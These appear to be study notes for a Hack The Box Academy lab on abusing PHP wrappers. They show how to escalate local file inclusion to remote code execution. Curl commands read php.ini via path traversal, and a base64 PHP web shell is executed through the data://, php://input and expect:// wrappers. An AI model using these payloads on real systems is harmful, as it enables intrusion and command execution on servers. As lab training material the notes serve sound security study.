# PHP Wrappers - [LINK](https://academy.hackthebox.com/app/module/23/section/253)



While LFI can be used to leak credentials (e.g., database passwords in `config.php` or SSH keys in `~/.ssh/id_rsa`), **PHP Wrappers** allow for direct Remote Code Execution (RCE) if specific server configurations are met.

## 1. Checking PHP Configurations (`php.ini`)

Before utilizing wrappers like `data://` or `php://input`, you often need to verify if the `allow_url_include` setting is enabled.

* **Common `php.ini` Paths:**
* Apache: `/etc/php/X.Y/apache2/php.ini` (e.g., `/etc/php/7.4/apache2/php.ini`)
* Nginx: `/etc/php/X.Y/fpm/php.ini`


* **Command to read `php.ini` (via LFI + Base64 Filter):**
```bash
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"

```


* **Command to decode and check setting:**
```bash
echo '<BASE64_STRING_FROM_OUTPUT>' | base64 -d | grep allow_url_include
# Look for: allow_url_include = On

```

## 2. The `data://` Wrapper

The `data` wrapper allows you to include and execute external data (like PHP code) directly from the URL.

* **Requirement:** `allow_url_include = On`
* **Step 1: Create a Base64 PHP Web Shell:**
```bash
echo '<?php system($_GET["cmd"]); ?>' | base64
# Output: PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==

```


* **Step 2: URL Encode the Base64 String:** (Crucial: characters like `+` and `=` must be URL encoded to `%2B` and `%3D`).
* **Step 3: Execute via cURL:**
```bash
curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid

```


*Notice we append `&cmd=id` to pass our system command to the web shell.*

---

## 3. The `php://input` Wrapper

The `input` wrapper reads raw data from the HTTP request body (POST data) and executes it as PHP code.

* **Requirements:** `allow_url_include = On` **AND** the vulnerable parameter must accept POST requests.
* **Execution Method:** Send the PHP web shell in the `--data` (POST body) and pass the command in the URL (if the backend uses `$_REQUEST`), or hardcode the command directly in the POST body.
* **Command:**
```bash
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid

```


*(If it strictly requires POST and ignores GET commands, use: `--data '<?php system("id"); ?>'`)*

---

## 4. The `expect://` Wrapper

The `expect` wrapper is designed to directly execute system commands via URL streams without needing a PHP web shell payload.

* **Requirement:** The `expect` PHP extension must be manually installed and enabled on the server (`extension=expect` in `php.ini`).
* **Checking for Expect (via `php.ini`):**
```bash
echo '<BASE64_STRING_FROM_OUTPUT>' | base64 -d | grep expect
# Look for: extension=expect

```


* **Execution Command:** Pass the OS command directly after `expect://`.
```bash
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id" | grep uid

```
